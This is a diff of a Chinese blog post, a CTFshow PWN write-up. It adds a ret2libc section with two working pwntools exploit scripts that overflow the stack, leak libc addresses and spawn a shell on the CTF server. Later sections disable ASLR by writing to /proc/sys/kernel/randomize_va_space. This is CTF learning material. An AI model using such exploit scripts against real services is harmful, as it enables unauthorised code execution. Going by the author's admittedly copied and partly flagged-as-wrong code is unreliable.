@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-29T20:56:26&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-30T23:43:52&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="ctfshow-pwn-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
@@ -761,7 +761,9 @@ unicode: "ece7"
             <li><a href="#逐行解析手敲shellcode">逐行解析手敲shellcode</a></li>
           </ol>
         </li>
-        <li><a href="#pwn_025">PWN_025</a></li>
+        <li><a href="#pwn_025待定">PWN_025（待定）</a></li>
+        <li><a href="#pwn_026">PWN_026</a></li>
+        <li><a href="#pwn_027">PWN_027</a></li>
       </ol>
     </li>
   </ol>
@@ -852,7 +854,6 @@ unicode: "ece7"
     <p>[TOC]</p>
 <p>**前文：以下是我<a class="link" href="https://ctf.show/challenges"  target="_blank" rel="noopener"
     >ctfshow</a>的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄</p>
-<p>前文：每题我都放了链接，供下载，要靶场的题不能做，PWN_005&ndash;PWN_016，PWN_20&ndash;PWN_022，PWN_026&ndash;PWN_029不需要靶场是可以做的，供大家食用PWN。</p>
 <h2 id="test_your_nc">Test_your_nc
 </h2><h3 id="pwn_000">PWN_000
 </h3><p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
@@ -2822,7 +2823,7 @@ unicode: "ece7"
 	
 ></p>
 <p>看着确实比较乱&hellip;..😅</p>
-<p>最后的最后我想对这题做些评价加，其实不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄</p>
+<p>最后的最后我想对这题做些评价，其实题不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄</p>
 <p><img src="/p/ctfshow-pwn-writeup/67.png"
 	width="856"
 	height="304"
@@ -2838,9 +2839,344 @@ unicode: "ece7"
 	
 ></p>
 <p>大致思路知道就好，靶机的flag是动态变化的。</p>
-<h3 id="pwn_025">PWN_025
+<h3 id="pwn_025待定">PWN_025（待定）
 </h3><p>题目：开启NX保护，或许可以试试ret2libc</p>
 <p><a class="link" href="PWN_025" >PWN_025</a></p>
+<p>根据题目，也就是说具体攻击手法为：<code>ret2libc</code></p>
+<p>checksec一下，发现开了MX保护，也就是说不能用shellcode了。</p>
+<p><img src="/p/ctfshow-pwn-writeup/68.png"
+	width="746"
+	height="164"
+	srcset="/p/ctfshow-pwn-writeup/68_hu_a99ea644fc591014.png 480w, /p/ctfshow-pwn-writeup/68_hu_74f646b65d73e4a1.png 1024w"
+	loading="lazy"
+	
+		alt="x32"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="454"
+		data-flex-basis="1091px"
+	
+></p>
+<p>IDAx32分析，也没有/bin/sh、后门：</p>
+<p><img src="/p/ctfshow-pwn-writeup/69.png"
+	width="1324"
+	height="545"
+	srcset="/p/ctfshow-pwn-writeup/69_hu_6b3b5c81b042741f.png 480w, /p/ctfshow-pwn-writeup/69_hu_60765907f2428b45.png 1024w"
+	loading="lazy"
+	
+		alt="无/bin/sh路径"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="583px"
+	
+></p>
+<p>&hellip;&hellip;</p>
+<p>ret2libc攻击（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和&quot;/bin/sh&quot; 字符串的地址。构造新的 payload，使用泄露的 system 函数和 &ldquo;/bin/sh&rdquo; 字符串的地址来进行get shell）</p>
+<p>exp备注版：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># 导入pwntools库，提供漏洞利用常用功能（如连接、打包等）</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># 导入LibcSearcher，用于根据泄露的函数地址查找对应libc版本</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># 设置日志级别为debug，显示详细的交互过程（方便调试）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 建立与目标服务的连接（远程服务器地址和端口）</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 加载目标二进制文件，获取符号信息（如函数地址、GOT表地址等）</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取main函数的地址（用于第一次溢出后跳回main函数，进行二次攻击）</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取write函数的GOT表地址（Global Offset Table，存储函数的真实内存地址）</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取write函数的PLT表地址（Procedure Linkage Table，用于间接调用函数）</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造第一次攻击的payload（栈溢出利用）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. 填充缓冲区到返回地址：0x88是缓冲区大小，0x4是ebp寄存器大小（32位程序）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 返回地址：覆盖为write@plt（调用write函数输出数据）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. write执行完后跳转的地址：main函数（回到程序开头，方便第二次攻击）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. write函数的参数1：文件描述符0（错误！应为1，stdout标准输出，否则无法正确泄露数据）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 5. write函数的参数2：要泄露的地址（write@got，存储write的真实内存地址）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 6. write函数的参数3：泄露的字节数（4字节，32位地址长度）</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送第一次payload，触发栈溢出，执行write函数泄露地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 接收泄露的write函数真实地址（4字节，32位），并转换为整数</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>  <span class="c1"># 打印泄露的地址（十六进制）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用LibcSearcher根据write函数地址查找对应的libc版本</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="n">write</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 计算libc的基地址：libc基地址 = 泄露的函数地址 - 该函数在libc中的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 计算system函数的地址：system地址 = libc基地址 + system在libc中的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 计算&#34;/bin/sh&#34;字符串的地址：bin_sh地址 = libc基地址 + 字符串在libc中的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造第二次攻击的payload（获取shell）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. 同样的填充：覆盖缓冲区和ebp</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 返回地址：覆盖为system函数地址（调用system执行命令）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. system执行完后跳转的地址：main函数（可选，不影响shell使用）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. system函数的参数：&#34;/bin/sh&#34;字符串的地址（执行该命令获取交互shell）</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送第二次payload，触发栈溢出，执行system(&#34;/bin/sh&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 进入交互模式，与获取的shell进行交互（输入命令等）</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原版exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护可以使用哪些攻击手法（好吧其实我也不会，这些是抄的wp，这里等我学会栈这部分我再来解决，PWN确实入门比较难，深入学更难&hellip;.）</p>
+<p>感觉强度上来了，做得有点吃力。</p>
+<h3 id="pwn_026">PWN_026
+</h3><p>题目：设置好 ASLR 保护参数值即可获得flag。为确保flag正确，本题建议用提供虚拟机运行。  <a class="link" href="PWN_26%5cPWN" >PWN</a>  <a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
+    >libc-2.27.so</a> （提取码show）</p>
+<p>这题坑到我了，运行程序发现直接爆flag，交上去发现是假的/(ㄒoㄒ)/~~</p>
+<p>IDAx64分析，有system后门函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/70.png"
+	width="1195"
+	height="590"
+	srcset="/p/ctfshow-pwn-writeup/70_hu_5af04d0f0913cda9.png 480w, /p/ctfshow-pwn-writeup/70_hu_4cf51b4305482ce.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="486px"
+	
+></p>
+<p>而且可以知道这个flag是有几个printf、puts共同打印出的、字符串由地址拼接（%p打印指针或者地址，以16进制形式）而成。</p>
+<p>运行一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/71.png"
+	width="1250"
+	height="719"
+	srcset="/p/ctfshow-pwn-writeup/71_hu_e57bc28849d3c88.png 480w, /p/ctfshow-pwn-writeup/71_hu_1586fa3609ae168d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="417px"
+	
+></p>
+<p>每次flag都不一样，说明地址一直在变化，也就是地址随机化。</p>
+<p>在Linux保护机制有讲过ASLR，关于<a class="link" href="http://localhost:1313/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
+    >ASLR保护可以看回PWN-1</a>：ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置。</p>
+<p>gdb调试一下，题目早给出了2，在这里单纯演示一下；</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb -q pwn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/72.png"
+	width="1110"
+	height="410"
+	srcset="/p/ctfshow-pwn-writeup/72_hu_f7e2f4bac4aac2dd.png 480w, /p/ctfshow-pwn-writeup/72_hu_1517f77077b3d7c7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="649px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell cat /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>虽然 <code>checksec</code> 输出中没有直接的 ASLR 开启状态，但可以结合系统层面的设置（通过 <code>cat/proc/sys/kernel/randomize_va_space</code> 查看，输出 <code>0</code> 表示关闭 ASLR，<code>1</code> 表示部分开启，<code>2</code> 表示完全开启 ）来判断程序运行时的 ASLR 情况。</p>
+<p>既然地址随机化保护，我们就把它关掉（记得提权root）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/73.png"
+	width="1340"
+	height="774"
+	srcset="/p/ctfshow-pwn-writeup/73_hu_b96db4a3f2e41298.png 480w, /p/ctfshow-pwn-writeup/73_hu_5ee4a282ddb01af4.png 1024w"
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="415px"
+	
+></p>
+<p>这里有个点就是我的flag是ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}</p>
+<p>但不知为啥和官方不一样flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
+<p>但我的程序运行了三次，ASRL也关了，flag出来的是一样的，代表地址是真实的，flag没错的。反正大体思路是正确的。</p>
+<blockquote class="alert alert-tip">
+    <p>总之记住：/proc/sys/kernel/randomize_va_space</p></blockquote>
+<h3 id="pwn_027">PWN_027
+</h3><p>题目：设置好 ASLR 保护参数值即可获得flag。<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
+    >libc-2.27.so</a>   <a class="link" href="PWN_027%5cPWN" >PWN</a></p>
+<p>这题也是一样的，”If the result is 0 or 1, then you get the correct flag!“将ASLR保护的数值改成1或0就好。（套上题的公式）</p>
+<p>怪怪的：</p>
+<p><img src="/p/ctfshow-pwn-writeup/74.png"
+	width="579"
+	height="161"
+	srcset="/p/ctfshow-pwn-writeup/74_hu_a5de9c2fc5414abb.png 480w, /p/ctfshow-pwn-writeup/74_hu_32320de88db9a594.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="359"
+		data-flex-basis="863px"
+	
+></p>
+<p>官方flag是ctfshow{0x400687_0x400560_0x603260}</p>
+<p>欸我发现&hellip;.0x603260的后面的6变成a了，有点招笑&hellip;应该是Kali环境和Ubuntu不同，我去网上查了下，发现大部分PWN的WP都是用Ubuntu解的：</p>
+<p><img src="/p/ctfshow-pwn-writeup/75.png"
+	width="1203"
+	height="595"
+	srcset="/p/ctfshow-pwn-writeup/75_hu_d19abb44e81b7200.png 480w, /p/ctfshow-pwn-writeup/75_hu_da8dd3cdf4dd0a83.png 1024w"
+	loading="lazy"
+	
+		alt="Ubuntu"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="485px"
+	
+></p>
+<p>这里的flag就是正常的了。从现在开始我将彻底使用Ubuntu了。</p>
 
 </section>
 
@@ -2858,7 +3194,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-08-29
+            最后更新于 2025-08-30
         </span>
     </section></footer>
 
@@ -3112,7 +3448,7 @@ unicode: "ece7"
 <section class="wordcount">
   <div class="wordcount-row">
     <p>博主发布了7篇文章  ||</p>
-    <p>总共79.22k 字</p>
+    <p>总共82.04k 字</p>
   </div>
 </section>
         
